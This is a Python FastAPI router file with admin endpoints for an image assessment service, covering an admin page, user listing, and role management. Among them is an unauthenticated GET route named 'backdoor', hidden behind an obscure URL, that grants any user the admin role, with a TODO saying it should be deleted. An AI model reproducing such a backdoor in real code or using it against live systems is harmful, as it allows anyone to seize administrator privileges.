from fastapi import APIRouter, Depends, Request
from fastapi.responses import HTMLResponse
from image_assessment_service.autorization.controllers.utils import (
    get_current_user,
    require_role,
)
from image_assessment_service.autorization.models.core import User
from image_assessment_service.config import get_config, get_templates
from image_assessment_service.dependencies import get_container
from pydantic import BaseModel

admin_service = get_container().admin_service

config = get_config().tasks
templates = get_templates()
router = APIRouter()


class UpdateRole(BaseModel):
    role: str


@router.get("/promote-to-admin-123124123432412312321/{user_id}")
async def backdoor(request: Request, user_id: int):
    # TODO: Delete this method
    await admin_service.add_role(user_id, "admin")
    return "success"


### static ###


@router.get("/admin", response_class=HTMLResponse)
async def task_page(request: Request):
    return templates.TemplateResponse("admin.html", {"request": request})


### api ###


@router.get("/api/admin/myid")
async def get_users(request: Request, user: User = Depends(get_current_user)):
    return user.id


# admin only
@router.get("/api/admin/users")
async def get_users(request: Request, user: User = Depends(require_role("admin"))):
    users = await admin_service.get_users_with_roles()
    return users


@router.post("/api/admin/users/{user_id}/roles")
async def add_role(
    request: Request,
    user_id: str,
    updateRole: UpdateRole,
    user: User = Depends(require_role("admin")),
):
    role = updateRole.role
    await get_container().admin_service.add_role(user_id, role)
    users = await admin_service.get_users_with_roles()
    return users


@router.delete("/api/admin/users/{user_id}/roles")
async def remove_role(
    request: Request,
    user_id: str,
    updateRole: UpdateRole,
    user: User = Depends(require_role("admin")),
):
    role = updateRole.role
    await admin_service.remove_role(user_id, role)
    users = await admin_service.get_users_with_roles()
    return users
